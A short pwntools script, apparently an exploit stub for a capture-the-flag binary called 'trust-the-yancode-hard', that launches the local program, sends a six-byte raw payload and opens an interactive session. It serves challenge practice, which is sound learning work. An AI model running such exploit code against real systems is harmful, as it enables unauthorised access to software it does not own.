#!/usr/bin/python3

from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = context.binary = ELF("./trust-the-yancode-hard")

# Your code here
io = process()

payload = b"\x80\x3c\x42\xf9\x51\x51"

io.sendline(payload)

io.interactive()
